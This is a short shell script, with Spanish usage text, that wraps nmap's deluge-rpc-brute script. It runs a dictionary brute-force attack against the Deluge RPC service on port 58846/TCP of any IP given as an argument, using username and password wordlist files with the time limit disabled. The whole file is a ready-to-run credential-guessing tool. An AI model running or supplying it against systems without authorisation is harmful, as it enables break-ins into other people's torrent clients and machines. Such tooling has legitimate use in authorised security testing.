...
if [ -z "$1" ]; then
        echo
        echo "Fuerza bruta con diccionarios a RPC en puerto 58846/TCP."
        echo "Requiere nmap"
        echo "Uso.: sh bruterpc.sh <ip>"
        echo
        exit 0
fi
echo
echo
nmap $1 -p 58846 --script deluge-rpc-brute -script-args userdb=usuarios.txt,passdb=claves.txt,unpwdb.timelimit=0
